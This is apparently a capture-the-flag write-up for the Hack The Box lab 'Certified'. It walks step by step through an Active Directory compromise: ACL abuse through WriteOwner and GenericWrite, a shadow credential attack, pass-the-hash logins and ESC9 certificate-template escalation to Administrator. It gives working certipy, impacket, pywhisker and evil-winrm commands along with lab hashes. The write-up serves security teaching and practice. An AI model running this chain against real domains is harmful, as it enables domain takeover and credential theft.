Certified is a medium difficulty box. This is an assumed breach scenario, therefore, we start with some credentials for the judith user. This user has the WriteOwner ACL over the management group, we can leverage this ACL to add the judith user to this group which has GenericWrite to the management_svc user letting us extract its NTLM hash via a shadow credential attack. This user is able to PSRemote to the DC which gets us the user flag. management_svc has GenericAll over the ca_operator user which can exploit the ESC9 vulnerability which we can then use to get the Administrators NTLM hash.

## Enumeration
As always, we can start enumerating the box with an nmap scan. We can see that we are dealing with an active directory machine due to port 88 being open. Other than that, the nmap scan does not reveal anything interesting. Things to look out for would be a MSSQL database being open or a website on port 80, since it only has default ports open we can move on to SMB.


#### Nmap

```

#### SMB
We can enumerate the available smb shares with netexec which shows the Windows Server version of the machine and the domain name. All of these are handy when it comes to using commands that require the domain name and knowing the windows server version helps when attempting privilege escalation exploits. 

```
netexec smb 10.10.11.41 -u judith.mader -p judith09 --shares
SMB  10.10.11.41     445    DC01  [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)

SMB  10.10.11.41     445    DC01  SYSVOL          READ            Logon server share 
```

The available shares are just the default ones and after scanning them with smbclient they all appear to be empty or do not contain any useful information.

#### BloodHound
Since nmap and smb did not get us anything useful we can try with a bloodhound scan to reveal which ACL's the judith user might have.

```
bloodhound-python -u 'judith.mader' -p 'judith09' -ns 10.10.11.41 -d certified.htb -c all 
```

After uploading the data to bloodhound as a zip file we can see that judith has a path to management_svc which can PSRemote to the domain controller. With the ability to land a powershell session into the DC comes the possibility of privilege escalation.

![certified](assets/images/certified/judith.png)

## Taking Advantage of WriteOwner 
First we must change the group owner of the management group and assign us the ability to add members to this group, we can then add the judith user. To do so we can use the following set of commands:

```
owneredit.py  -action write -new-owner 'judith.mader' -target 'management' 'certfified.htb'/'judith.mader':'judith09' -dc-ip 10.10.11.41
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Current owner information below
[*] - SID: S-1-5-21-729746778-2675978091-3820388244-1103
[*] - sAMAccountName: judith.mader
[*] - distinguishedName: CN=Judith Mader,CN=Users,DC=certified,DC=htb
[*] OwnerSid modified successfully!
```

Judith is now the new owner of this group, we can grant ourselves the AddMember privilege with the following command:

```
dacledit.py -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' 'certified.htb'/'judith.mader':'judith09'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20250529-202124.bak
[*] DACL modified successfully!
```

Finally we can add judith to the group from which we can leverage the GenericWrite privilege over the management_svc user. 

```
net rpc group addmem "Management" "judith.mader" -U "certified.htb"/"judith.mader"%"judith09" -S "10.10.11.41"
```

## Using GenericWrite to perform a Shadow Credential Attack
With the GenericWrite privilege we can either perform a targeted kerberoast attack or add a shadow credential which we can use to get the NTLM hash of the user. I prefer doing the kerberoast attack as it is quite fast, if the hash cracks we get easy access with the cracked password, if it fails well, we did not waste that much time trying.

```
targetedKerberoast.py -v -d 'certified.htb' -u 'judith.mader' -p 'judith09'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[!] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

We get an error saying that the server and our machine have a clock skew that is too large and the command fails. To fix this we can use the ntpdate command which steps our time to the server's. I like using `;` as it allows the second command to execute right after changing the time which is useful, as ntpdate only skip our time for a brief moment.

```
sudo ntpdate 10.10.11.41 ; python3 /home/madaf/HTB/labs/administrator/targetedKerberoast/targetedKerberoast.py -v -d 'certified.htb' -u 'judith.mader' -p 'judith09'

```

We get the hash of management_svc user, we can use hashcat to try to crack the password. 

```
hashcat management_svc.hash /usr/share/wordlists/rockyou.txt -m 13100
<SNIP>
Session..........: hashcat                                
Status...........: Exhausted

```

We are not able to crack the password but we can still perform the shadow credential attack. I found two ways to execute it one being much simpler than the other, but I will still show both methods.

#### PYWhisker method
We can use pywhisker to create a PFX file that we can use to authenticate as the management_svc user, we can install pywhikser by creating a python virtual environment and thne running `pip install pywhisker`, we can then use the following command to create the pfx file.

```
pywhisker -d "certified.htb" -u "judith.mader" -p "judith09" --target "management_svc" --action "add" --dc-ip 10.10.11.41

[*] Must be used with password: gyii9GUBQp5oPVgnnIAy
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

The tool itself points us to PKINITtools which we can use to find the NTLM hash. To do so we must first clone the github repository. This repository uses an oscrypto version that break so we must also add a compatible version to the requirements.txt file.

```
git clone https://github.com/dirkjanm/PKINITtools
cd PKINITtools
vim requirements.txt -> add the following in a new line: 
oscrypto @ git+https://github.com/wbond/oscrypto.git@d5f3437ed24257895ae1edd9e503cfb352e635a8

pip install -r requirements.txt
```

We can now use the python scripts inside PKINITtools, I also changed the pfx file name to something easier to read. Remember to use ntpdate to avoid the clock skew errors:

```
sudo ntpdate 10.10.11.41; python3 gettgtpkinit.py -cert-pfx management_svc.pfx -pfx-pass gyii9GUBQp5oPVgnnIAy certified.htb/management_svc management.ccache -dc-ip 10.10.11.41 -v

```

This created the ccache file that we can use to authenticate with kerberos and the file key to use it. We can export the ccache file so its easier to use.

```
export KRB5CCNAME=management.ccache

klist
Ticket cache: FILE:management.ccache
Default principal: management_svc@CERTIFIED.HTB

```

We can now get the NTLM hash of the management_svc user with this command:

```
sudo ntpdate 10.10.11.41 ; python3 getnthash.py certified.htb/management_svc -key a2e812a9dab1dea0480dc7e75666beb554ad78b7f5b6ce31d5d1b3bcf218d303

Note that the key was provided to us whne we ran the gettgtpkinit.py script. 
#### Certipy method
The easier way to do this attack is with the following certipy command:
```
sudo ntpdate 10.10.11.41 ;certipy shadow auto -target certified.htb -username judith.mader@certified.htb -password judith09  -account management_svc -dc-ip 10.10.11.41

```

We can then winrn into the box with the following command:

```
evil-winrm -i 10.10.11.41 -u management_svc -H a091c1832bcdd4677c28b5a6a1295584

```

## Using GenericAll to get ca_operator's NTLM hash
Since we have access to the box we could try privilege escalation methods but after a quick look it seemed unlikely that this is the intended path, everything looks like a default configuration and there are no extra directories or running processes that could hint towards an exploit. Going back over the bloodhound data we can see that the user we just compromised, managemetn_svc, has GenericAll over the ca_operator user. We can change the password of this user but I just opted for a shadow credential attack, using the same certipy command as before I am able to get the NTLM has of this user.

## Using ESC9 to get Administrator NTLM hash
Now that we have the NTLM hash for the ca_operator user we could go on a bunch of different tangets to try to find a way to the Admin user but come on, lets be honest, the name of the box is Certified. We can run certipy on this account which shows that the DC is vulnearble to ESC9.

```

```

I used [this page](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc9-no-security-extension-on-certificate-template) to guide me through the exploitation process. It is actually quite simple. First we must see that ca_operator can be enrolled into the vulnerable template, since we have the hash of this user its really easy to do. We can start off by changing the UPN to be the administrator's sAMAccountName which is usually Administrator.

```
certipy account -u 'management_svc@certified.htb' -hashes 'a091c1832bcdd4677c28b5a6a1295584' -dc-ip '10.10.11.41' -upn 'administrator' -user 'ca_operator' update

[*] Updating user 'ca_operator':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_operator'
```

Note that I used the management user to execute this command as I know this user has the GenericAll ACL for ca_opearator. We can then request the certificate as the ca_operator, which will instead point to the Administrator user. We must specify the CA name and the template that is vulnerable, all of this data was provided in the command we used above to check for vulnerabilities.

```
certipy req -u ca_operator -hashes b4b86f45c6018f1b664f70805f45d8f2 -dc-ip '10.10.11.41' -ca 'certified-DC01-CA' -template 'CertifiedAuthentication'

[*] Saving certificate and private key to 'ca_operator.pfx'
[*] Wrote certificate and private key to 'ca_operator.pfx'
```

After this command we must change the upn of the user ca_operator to its orignal value so it does not conflict with the authentication.

```
certipy account     -u 'management_svc@certified.htb' -hashes 'a091c1832bcdd4677c28b5a6a1295584'     -dc-ip '10.10.11.41' -upn 'ca_operator'     -user 'ca_operator' update

[*] Updating user 'ca_operator':
    userPrincipalName                   : ca_operator

```

Finally we can use certipy with the auth option to use the pfx file we got to authenticate as the administrator user which gives us the NTLM hash and we are able to winrrm into the DC.

```
